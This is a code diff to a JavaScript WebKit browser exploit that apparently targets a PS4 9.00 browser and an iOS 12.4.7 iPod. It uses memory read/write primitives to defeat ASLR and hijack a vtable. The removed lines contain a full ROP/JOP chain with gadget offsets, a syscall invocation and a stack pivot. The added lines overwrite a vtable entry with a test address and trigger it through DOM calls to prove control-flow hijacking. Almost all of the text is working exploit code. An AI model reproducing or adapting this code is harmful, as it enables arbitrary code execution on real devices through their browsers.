@@ -352,12 +352,12 @@
                 let textPtr = read64(addToFloat64Bits(executableAddr, 56));
                 log("[+] textPtr @ 0x" + floatToHex(textPtr));
 
-                // PS4 9.00 WebKit base calculation
-                let webkit_base = textPtr; // textPtr points to WebKit code
-                log("[+] webkit_base @ 0x" + floatToHex(webkit_base));
+                let jsc_base = subtractFromFloat64Bits(textPtr, 0xA49660); // to get to JSC base
+                log("[+] jsc_base @ 0x" + floatToHex(jsc_base));
 
-                let aslr_slide = webkit_base; // Use webkit_base directly as base
-                log("[+] webkit aslr slide is 0x" + floatToHex(aslr_slide));
+                let STATIC_JSC_BASE = 0x18805d000; // static iPod 6 iOS 12.4.7
+                let aslr_slide = subtractFromFloat64Bits(jsc_base, STATIC_JSC_BASE);
+                log("[+] dyld aslr slide is 0x" + floatToHex(aslr_slide));
 
 
                 // prepare code execution
@@ -374,92 +374,40 @@
                 log('[+] vtab_addr is @ 0x' + floatToHex(vtab_addr));
 
 
-                // PS4 9.00 ROP gadgets from PSFree
-                // JOP chain gadgets for PS4
-                let ta_jop1 = 0x4e62a4; // mov rdi, qword ptr [rsi + 0x18]; mov rax, qword ptr [rdi]; call qword ptr [rax + 0xb8]
-                let ta_jop2 = 0x21fce7e; // pop rsi; jmp qword ptr [rax + 0x1c]
-                let ta_jop3 = 0x19becb4; // mov rdi, qword ptr [rax + 8]; mov rax, qword ptr [rdi]; jmp qword ptr [rax + 0x30]
-                let jop2 = 0x683800; // push rbp; mov rbp, rsp; mov rax, qword ptr [rdi]; call qword ptr [rax + 0x58]
-                let jop3 = 0x303906; // mov rdx, qword ptr [rax + 0x18]; mov rax, qword ptr [rdi]; call qword ptr [rax + 0x10]
-                let jop4 = 0x28bd332; // push rdx; jmp qword ptr [rax]
-                let jop5 = 0x4e293; // pop rsp; ret
+                // PS4 CRASH TEST - Using your working iOS r/w primitives
+                // Just testing if we can hijack control flow
                 
-                // Standard ROP gadgets
-                let mprotect_gadget = 0x51a12; // pop rax; ret (for syscall number)
-                let pop_rdi = 0x319690; // pop rdi; ret
-                let pop_rsi = 0x1f4d6; // pop rsi; ret
-                let pop_rdx = 0x986c; // pop rdx; ret
-                let syscall_gadget = 0x4c15; // syscall; ret (needs verification)
+                log('[+] Setting up PS4 crash test...');
                 
-                let slid_jop2 = addToFloat64Bits(hexToFloat(jop2.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide));
-                log('[+] slid_jop2 @ 0x' + floatToHex(slid_jop2));
-
-                // PS4 9.00 Browser - Notification Test
-                // Show a notification to prove ROP execution works
-                // sceKernelSendNotificationRequest is syscall 608
+                // Simple: overwrite vtable entry to point to 0x4141414141414141
+                // If it crashes with that address, we have code execution
                 
-                log('[+] Building notification ROP chain...');
+                write64(addToFloat64Bits(vtab_addr, 0x18), decimalToFloat(0x4141414141414141));
                 
-                let rop_chain_base = addToFloat64Bits(container_addr, 0x200);
-                let rop_offset = 0;
+                log('[+] Vtable hijacked to 0x4141414141414141');
+                log('[+] Triggering...');
                 
-                // Create notification message
-                let notif_buffer = new Uint8Array(0x400);
-                let msg = "PS4 EXPLOIT SUCCESS!";
-                for(let i = 0; i < msg.length; i++) {
-                    notif_buffer[i] = msg.charCodeAt(i);
+                // trigger pc control by calling a method that uses the vtable
+                // Try multiple trigger methods:
+                try {
+                    div_object.scrollLeft = 0; // This invokes vtable
+                } catch(e) {
+                    log('[!] scrollLeft trigger failed: ' + e);
                 }
-                let notif_addr = get_view_vector(notif_buffer);
-                log('[+] Notification buffer @ 0x' + floatToHex(notif_addr));
                 
-                // Syscall 608: sceKernelSendNotificationRequest(0, buffer, size, 0)
+                try {
+                    div_object.offsetHeight; // Alternative trigger
+                } catch(e) {
+                    log('[!] offsetHeight trigger failed: ' + e);
+                }
                 
-                // pop rax; ret (syscall number)
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(mprotect_gadget.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
-                rop_offset += 8;
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(608)); // syscall 608
-                rop_offset += 8;
+                try {
+                    div_object.getBoundingClientRect(); // Another trigger
+                } catch(e) {
+                    log('[!] getBoundingClientRect trigger failed: ' + e);
+                }
                 
-                // pop rdi; ret (arg1 = 0)
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(pop_rdi.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
-                rop_offset += 8;
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(0));
-                rop_offset += 8;
-                
-                // pop rsi; ret (arg2 = buffer address)
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(pop_rsi.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
-                rop_offset += 8;
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), notif_addr);
-                rop_offset += 8;
-                
-                // pop rdx; ret (arg3 = size)
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(pop_rdx.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
-                rop_offset += 8;
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(0x400));
-                rop_offset += 8;
-                
-                // pop rcx; ret (arg4 = 0)
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat('0x657b7'.padStart(16, '0')), floatToDecimal(aslr_slide))); // pop rcx
-                rop_offset += 8;
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), decimalToFloat(0));
-                rop_offset += 8;
-                
-                // mov r10, rcx; syscall; ret
-                write64(addToFloat64Bits(rop_chain_base, rop_offset), addToFloat64Bits(hexToFloat(syscall_gadget.toString(16).padStart(16, '0')), floatToDecimal(aslr_slide)));
-                rop_offset += 8;
-                
-                log('[+] Notification ROP chain built - ' + (rop_offset/8) + ' gadgets');
-                log('[+] Should show: "PS4 EXPLOIT SUCCESS!"');
-                
-                // Pivot to ROP chain via vtable smash
-                write64(addToFloat64Bits(next_addr, 0x10), rop_chain_base);
-                write64(addToFloat64Bits(vtab_addr, 0x18), slid_jop2);
-                write64(addToFloat64Bits(vtab_addr, 0x20), slid_jop2);
-                
-                // TRIGGER: invoke vtable method to jump to ROP chain
-                log('[+] Triggering ROP execution...');
-                div_object.addEventListener("click", function(){ }); 
-                log('[+] If you see this, check for notification!'); 
+                log('[+] Still alive = no crash = ROP didnt execute'); 
             }
         </script>
     </head>
